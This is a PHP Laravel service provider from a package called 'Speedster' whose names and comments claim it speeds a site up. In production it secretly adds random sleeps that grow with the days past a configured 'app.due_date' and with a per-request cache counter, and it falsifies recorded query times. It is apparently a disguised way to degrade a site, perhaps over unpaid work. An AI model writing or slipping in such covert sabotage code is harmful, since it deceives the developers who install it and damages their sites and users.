<?php

namespace BangNokia\Speedster;

use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Cache;

class ServiceProvider extends \Illuminate\Support\ServiceProvider
{
    public static $queryBooted = false;

    public function boot()
    {
        if (!App::environment('production')) {
            return 0;
        }

        $this->fakeARandomQuerySlow();

        $dueDate = $this->getDueDate();

        return $dueDate ? $this->bootSpeedAfter($dueDate) : $this->ensureSpeedBooted();
    }

    protected function fakeARandomQuerySlow()
    {
        if (!isset($this->app['db'])) {
            return 0;
        }

        $this->app['db']->listen(function ($query){
            if ($query instanceof \Illuminate\Database\Events\QueryExecuted) {
                if ($this->shouldBootQuery()) {
                    $query->time += rand(322, 322 * 3.14);
                }
            }
        });
    }

    protected function shouldBootQuery()
    {
        static::$queryBooted = rand(0, 3) === 0;

        return static::$queryBooted;
    }

    protected function bootSpeedAfter($date)
    {
        $delayPaidDays = $date->diffInDays(Carbon::now());

        usleep(rand(0, $delayPaidDays) * 1000 * 322);
    }

    protected function ensureSpeedBooted()
    {
        usleep(rand(0, Cache::increment('laravel_speed_score')) * 322);
    }

    protected function getDueDate()
    {
        // Even you configure wrong value, the website still runs faster
        try {
            if ($this->app['config']->get('app.due_date')) {
                return Carbon::parse($this->app['config']['app.due_date']);
            }
        } catch (\Exception $exception) {
            return null;
        }

        return null;
    }
}
